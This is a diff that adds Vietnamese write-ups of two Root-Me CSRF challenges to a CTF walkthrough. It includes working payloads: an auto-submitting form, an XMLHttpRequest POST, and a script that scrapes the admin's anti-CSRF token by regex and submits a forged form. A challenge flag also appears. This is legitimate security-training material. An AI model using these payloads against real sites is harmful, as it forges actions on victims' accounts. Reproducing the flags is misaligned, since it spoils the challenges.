@@ -28,6 +28,8 @@
 - [XSS DOM Based – Eval](#xss-dom-based--eval)
   - [Description:](#description-5)
   - [Solution:](#solution-5)
+- [CSRF - 0 protection](#csrf---0-protection)
+- [CSRF - token bypass](#csrf---token-bypass)
 
 
 
@@ -282,3 +284,67 @@ Tương tự như trên, ta gửi đường link kèm theo payload cho admin tho
 ![img](./img/30.png)
 
 flag: rootme{Eval_Is_DangER0us}
+# CSRF - 0 protection
+Đây là 1 chall đơn giản gthieu về CSRF. yêu cầu chall là phải đọc được flag đưọc chứa trong thẻ ``private`` nhưng để đọc đuợc thì cần phải đuợc validate từ thằng admin.
+
+Và việc thực hiện validate đó sẽ đuợc diễn ra ở trang ``?action=profile``, ở đây nut checkbox bị disabled và chỉ có admin mới có quyền submit form.
+
+cuối cùng tại thẻ `` /?action=contact``, ta có thể gửi message cho admin. Vậy nhiệm vụ đơn giản sẽ là ta sẽ cho thằng admin thực hiện điền form hộ mình
+
+![img](./img/31.png)
+
+payload:
+```
+<form action="http://challenge01.root-me.org/web-client/ch22/?action=profile" method="post" enctype="multipart/form-data" id="fl">
+		<input type="text" name="username" value="qquang">
+		<input type="checkbox" name="status" checked >
+</form>
+<script>
+document.getElementById('fl').submit();
+</script>
+```
+note: action phải là full url và ô checkbox phải được ``checked``
+
+payload đấm bằng XMLHttpRequest:
+```
+<script>
+var xh=new XMLHttpRequest();
+xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
+xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+xh.send("username=qquang&status=checked");
+</script>
+```
+
+![img](./img/32.png)
+
+# CSRF - token bypass
+Cũng tuơng tự chall trên, nhưng chall này đã thêm token với mỗi lần request, nhiệm vụ ở đây là phỉa trộm đưọc token này
+
+payload:
+```
+<form action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" name="csrf_form" enctype="multipart/form-data">
+                <input id="username" type="text" name="username" value="qquang">
+                <input id="status" type="checkbox" name="status" checked >
+
+                // tag input của xhtml phỉa kết thúc bằng />
+                <input id="token" type="hidden" name="token" value="" />
+                <button type="submit">Submit</button>
+</form>
+
+<script>
+
+                xhttp = new XMLHttpRequest();
+                xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
+                xhttp.send();
+                //extract token
+                token_admin = (xhttp.responseText.match(/[abcdef0123456789]{32}/));
+
+                //thêm token vào form
+                document.getElementById('token').setAttribute('value', token_admin)
+
+                //submit
+                document.csrf_form.submit();
+</script>
+```
+
+![img](./img/32.png)
